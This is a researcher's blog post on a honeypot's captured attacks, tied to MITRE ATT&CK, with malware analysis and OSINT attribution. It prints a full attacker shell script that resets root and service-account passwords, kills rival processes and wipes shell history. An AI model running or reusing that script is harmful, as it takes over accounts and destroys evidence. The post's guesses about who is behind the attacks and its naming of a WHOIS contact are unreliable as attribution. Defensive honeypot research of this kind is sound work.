---
title: "I Planted A Honeypot in the Middle East"
categories:
  - Projects
---
On February 7, 2022, I planted a honeypot in Bahrain, one of the wealthiest countries in the Middle East.

Adversaries quickly noticed its presence and began executing a variety of attacks against it.

Over the span of a week, greater than 300,000 occurrences of unauthorized activity originated from around the globe, with hot spots being Vietnam, Russia, India, and the United States.

![Honeypot_Cover](https://user-images.githubusercontent.com/85040841/156161795-63aee9e7-a810-49c8-a04a-82ea34d891c0.png)

# What are Honeypots?

Honeypots are network-attached systems designed to mimic targets of cyberattacks.

Security researchers use them to identify attacks, deflect them from a legitimate target, and learn how hackers operate.

You might’ve never heard of them before, but honeypots have been around for decades.

The principle behind them is simple: **Don’t go looking for attackers.**

Instead, release something that would attract malicious entities — the honeypot — and then wait for them to show up.

# Purpose

Understanding the techniques, tactics, and procedures (TTPs) utilized by hackers is crucial to establishing innovative and effective security measures.  

In the field of cybersecurity, there are two primary “teams“ that are commonly referenced:

**Red Team and Blue Team.**

The former emulates the adversarial pursuits of attackers, whereas the latter identifies threat actors and defends infrastructures.

Both teams work in tandem to enhance the security status of an organization.

![Red_Team_Blue_Team](https://user-images.githubusercontent.com/85040841/156161828-fbdcd04f-8d9b-4bf4-a6e5-eac84ce22a01.png)

Now that you see the importance of grasping the offensive TTPs used by attackers, let me introduce you to the framework I’ll be using for that very purpose:

The MITRE ATT&CK framework.

**[MITRE ATT&CK](https://attack.mitre.org/) (Adversarial Tactics, Techniques, and Common Knowledge)** is a curated knowledge base and model for malicious cyber behavior, reflecting the various phases of an adversary’s attack lifecycle and the platforms they commonly target.

The framework is a valuable resource for everyone involved in InfoSec because of its depth regarding a hacker’s approach and mindset.

# Implementation

Inside of Amazon Web Services (AWS), I used a Debian 10 Buster EC2 instance to host [T-Pot](https://github.com/telekom-security/tpotce).

**T-Pot is a virtual machine (VM) created by T-Mobile that is composed of multiple honeypots.**

Every component inside the VM is [dockered](https://opensource.com/resources/what-docker), which means they’re in separate containers.

This enables T-Pot to run multiple tools and honeypot daemons on a shared network interface while maintaining a small footprint and constraining each honeypot within its own environment.

Here’s an overview of one of its built-in honeypot daemons:

### Cowrie

Cowrie is a medium-to-high interaction SSH and Telnet honeypot designed to **log brute-force attacks and shell commands** executed by attackers.

In medium interaction mode, it mirrors a UNIX system, whereas in high interaction mode, it functions as an SSH and Telnet proxy that observes malicious behavior.

### Installation

After launching the AWS instance, setting up T-Pot was simple:

- Cloned the T-Pot GitHub repository and completed the installation process
- Allowed administration from my IP address on two specific ports (64295 and 64297)
- Permitted traffic from the outside world on ports 1–64000

Using the ELK Stack it provides **(Elasticsearch, Logstash, and Kibana)**, I aggregated logs from my honeypot daemons and created visualizations for monitoring, troubleshooting, data analytics, etc.

![ELK](https://user-images.githubusercontent.com/85040841/156161894-fe2b1d52-06a8-4e38-94c8-619820f96cb4.png)

![Untitled](https://user-images.githubusercontent.com/85040841/156161950-0909a1a7-f7fb-44d7-94ab-e50b5e742947.png)

# MITRE ATT&CK Data Correlation

This article aims to tie my findings to the MITRE ATT&CK framework while also analyzing malware and conducting OSINT on the offenders.

Data analysis revealed that the main goals behind the attacks were to add my honeypot to a botnet and install cryptocurrency miners on it.

## Botnets

A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.

It is a sub-technique of [T1583](https://attack.mitre.org/techniques/T1583), Acquire Infrastructure, a resource development tactic within the MITRE ATT&CK framework.

![BotnetMAF](https://user-images.githubusercontent.com/85040841/156161968-1abb7a6d-3223-455f-a433-a1ca54ed1a53.gif)

“With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale phishing or Distributed Denial of Service (DDoS).”

The following commands display an information-gathering attack that was frequently performed against my Cowrie daemon:

![Untitled 1](https://user-images.githubusercontent.com/85040841/156161994-58698dd6-775a-4e22-967b-0a4204e19ab2.png)

Starting from the bottom, `ifconfig` was run to identify network interfaces on the machine.

Secondly, `uname -a` was executed to print all system information.

This was likely done to determine whether or not my honeypot's kernel version, OS architecture, and operating system coincided with the requirements for the adversary’s botnet.

Lastly, `cat /proc/cpuinfo` was used to print a read-only text file containing information about my honeypot's CPU.

Here’s an example of what that command would output:

```ruby
. . .
vendor_id       : GenuineIntel
cpu family      : 6
model           : 158
model name      : Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz
stepping        : 10
cpu MHz         : 3696.002
cache size      : 12288 KB
physical id     : 0
siblings        : 4
core id         : 0
cpu cores       : 4
. . .
```

These are all instances of [adversarial reconnaissance](https://attack.mitre.org/techniques/T1592/), a technique centered around using information from a victim’s host to improve the efficacy of malicious endeavors.

![Untitled 2](https://user-images.githubusercontent.com/85040841/156162035-9e7cbde3-af02-4815-bf38-ce4664273cad.png)

## Cryptocurrency Miners

A cryptominer is a stealthy type of malware that takes advantage of a system’s resources to generate revenue for the hackers controlling it, usually by mining Bitcoin, Ethereum, or Monero.

Instead of using expensive GPU farms, cryptominers utilize the processing power of compromised computers and servers.

This process, commonly referred to as **cryptojacking**, leads to adverse side effects such as:

- System disruption
- Increased processor usage
- Overheating machines
- Excessively high power bills

The following screenshot displays the commands that an attacker used to install a cryptominer called “c3pool_miner.”

![Untitled 3](https://user-images.githubusercontent.com/85040841/156162056-cba1ed9b-a560-4f6c-bcd6-77f069d9af57.png)

First, they retrieved a setup script via `curl` and piped it to Bash for execution.

Then, they filtered through all running processes with `ps | grep "[Mm]iner"` to see if their cryptominer was successfully installed.

This attack, known as resource hijacking, corresponds to [technique T1496](https://attack.mitre.org/techniques/T1496/) within MITRE ATT&CK and can be performed on virtually all platforms, including containerized environments.

![Untitled 4](https://user-images.githubusercontent.com/85040841/156162069-4971be00-b018-4176-affa-ffa2647ea811.png)

## Command History Exhibit

![](https://user-images.githubusercontent.com/85040841/156162487-cfa73e07-acfb-4441-ad9e-ba370adf7039.gif)

# Malware Analysis

`wget` and `curl` were frequently used by attackers to download and execute malicious files from external web servers.

Knowing that, let’s inspect some of the malware that hackers installed on my honeypot.

![Untitled 5](https://user-images.githubusercontent.com/85040841/156162083-9175daac-d01a-455e-b18b-f286442eab4e.png)

We can insert the SHA256 hashes (unique fingerprints) of interesting binary files into VirusTotal, an online resource used to analyze suspicious files and automatically share them with the InfoSec community.

## Mirai Botnet Malware

One of the malicious ELF 32-bit executables downloaded to my Cowrie honeypot-daemon belongs to the Mirai Botnet.

Mirai infects smart devices that run on ARC processors, effectively turning them into a network of remotely controlled bots or "zombies."

![Untitled 6](https://user-images.githubusercontent.com/85040841/156162095-8a6ee3c1-e776-4f42-8ce9-e21aa00518cc.png)

Mirai starts as a self-propagating worm, replicating itself once it infects and locates another vulnerable IoT device.

Propagation is accomplished by using infected IoT devices to scan the internet and discover additional vulnerable targets [(T0883.)](https://collaborate.mitre.org/attackics/index.php/Technique/T0883) 

If a suitable device is found, the already-infected device reports its findings back to a command and control (C2) server.

Once the C2 server receives a list of vulnerable devices, it loads a payload and infects the targets.

After compromising an array of machines, C2 servers can utilize many DDoS techniques such as HTTP, TCP, and UDP flooding [(T1498.001.)](https://attack.mitre.org/techniques/T1498/001/)

Mirai focuses on infecting as many devices as possible, which isn’t difficult due to the lack of security within Internet of Things (IoT) devices.

![Untitled 7](https://user-images.githubusercontent.com/85040841/156162111-68ea2c5e-8bc0-4b3e-8c81-d7d8532938f5.png)

Initially, Mirai compromised IoT devices with brute-force attacks that filled in 64 sets of default usernames and passwords like “admin” and “password.”

However, its latest modules use up-to-date vulnerabilities to maximize efficiency.

This can be seen in newer variants of the botnet, such as “IoT.Linux.MIRAI.VWISI” found in July 2020, which uses [CVE-2020-10173](https://nvd.nist.gov/vuln/detail/CVE-2020-10173) to exploit Comtrend VR-3033 routers.

Even more recently, AT&T’s Alien Labs identified a variant dubbed “Moobot” sharply increasing its scans for Tenda routers that are exploitable with a critical remote code execution (RCE) vulnerability.

## quickr1n.sh — Recon for Cryptominers

Here’s the content of `quickr1n.sh`, a malicious shell script that was executed on Cowrie:

```ruby
echo root:r14sdgs24h3h12sd344|chpasswd|bash;
echo gns3:1r43gs1asdan4asd4asd113s24h3h12344| sudo chpasswd -e
echo jenkins:r4113asdgs2asd4g1s324h3h12344| sudo chpasswd -e
echo ansible:r4131asdg1saasd14sn43gd24h3h12344| sudo chpasswd -e
#temp_root_pass
pkill java; pkill ntpd; pkill screen; pkill cnrig;
pkill xmrig; pkill brrr; pkill x86_64; pkill x86;
pkill docker; pkill tsm; pkill krn;
pkill ip; pkill .dhpcd; pkill xms;
echo fk
rm -rf /root/.history
rm -rf /root/*_history
rm -rf /root/.login
rm -rf /root/.logout
rm -rf /root/.bash_logut
rm -rf /root/.Xauthority
echo 1
nvidia-smi -q | grep "Product Name" | awk '{print $4, $5, $6, $7, $8, $9, $10, $11}' | grep . -c
lspci | grep "3D controller" | cut -f5- -d ' '
lspci | grep VGA -c
lspci | grep VGA | cut -f5- -d ' '
uptime -p
ip r | grep -Eo '[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/[0-9]{1,2}'
history -n; history -c
cat /dev/null > ~/.bash_history && history -c
echo done
```

Notice the line containing `nvidia-smi -q`?

Attackers used it to retrieve my honeypot's GPU specifications and gather cryptojacking info.

SHA256 hash of the script: `a9ee220389355426509c31859695bf2f062b5460743b32be5db8235115c489f5`

Entering the file’s unique fingerprint into VirusTotal provides the following page, showing that only 5 out of 59 security vendors flagged the file as malicious:

![Untitled 8](https://user-images.githubusercontent.com/85040841/156162132-5a640dde-a80e-438c-ad39-8c4181d05fde.png)

# OSINT

Now that we’ve gone over some of the malware installed on the honeypot, what’s next?

Well, you may be wondering *who* initiated these attacks.

We can utilize public resources and key aspects of the data we’ve gathered thus far to learn about potential culprits.

That’s the idea behind open-source intelligence, or OSINT for short.

The following demonstrates the detective-like approach I used to gain info on one of the attacks.

## The Swiss Origin of quickr1n.sh

My logs reveal that the cryptominer script mentioned earlier, `quickr1n.sh`, was installed by an entity in Zürich, Switzerland.

![Untitled 9](https://user-images.githubusercontent.com/85040841/156162151-754c6f00-0c92-4ae2-be2b-bc7eedb09192.png)

The attacker’s ISP, Private Layer, holds its operations in Panama City, Panama.

Their website shows that they provide unmanaged, dedicated servers hosted in Switzerland, a country known for its strict privacy laws.

![Untitled 10](https://user-images.githubusercontent.com/85040841/156162173-32caeca7-b862-4ce3-8ded-0ea8e9fef7b9.png)

Let’s travel to the coordinates we have, `47.355, 8.555`, inside of Google Maps.

![zoom](https://user-images.githubusercontent.com/85040841/156162963-0cab6f5c-03d2-4cb3-b1a6-40c262ec6c7f.gif)

Interesting... it looks like the attack originated very close to a university building!

Perhaps one or more of their machines are compromised?

![Untitled 11](https://user-images.githubusercontent.com/85040841/156163093-3db4f8ce-26f0-4ba1-abe6-98edddb47652.png)

According to Google Maps, the building is a subset of the University Hospital of Zürich.

“Kalaidos Fachhochschule Gesundheit” translates to **Careum University of Health.**

![Untitled 12](https://user-images.githubusercontent.com/85040841/156163082-79543cac-df79-481d-985a-663fdeb95bd3.png)

This isn’t surprising, as university hospitals (hospitals that conduct medical research and provide education to medical students) are frequent targets of cyberattacks.

Let’s conduct further reconnaissance on the IP address tied to the attack.

![Untitled 13](https://user-images.githubusercontent.com/85040841/156163072-721e5214-44a6-4a5b-b896-32e8f918d023.png)

Looks like it’s blacklisted by 13 out of 115 IP integrity engines.

Opening one of them, [DroneBL](https://dronebl.org/lookup?ip=179.43.170.173), reveals that it was flagged for automated SSH dictionary attacks on February 12, 2022, the same day of the attack!

![Untitled 14](https://user-images.githubusercontent.com/85040841/156163064-7a5cc189-8c81-4387-a4a8-27099c5ba30a.png)

We can advance our search by making a WHOIS query to obtain information on the IP address.

WHOIS is a public database that stores contact and registration information for domain names.

![Untitled 15](https://user-images.githubusercontent.com/85040841/156163052-cd3c4808-0364-4630-90db-acbc4af44258.png)

We received a name, Milciades Garcia, phone number, AND an address in Panama!

Googling the building shows that it’s a high-rise building mainly used for commercial offices.

![Untitled 16](https://user-images.githubusercontent.com/85040841/156163033-dfe41f8f-8330-43d1-a563-a7daa5f5d185.png)

![Untitled 17](https://user-images.githubusercontent.com/85040841/156163016-65e10a0d-31cb-4068-a39e-7c2c7b96f193.png)

Once again, it’s located right next to a hospital, which is interesting.

There are more OSINT areas we could look into if we wanted to go really in-depth, but I’ll stop here.

Thank you for reading about my experience planting a honeypot in the Middle East.
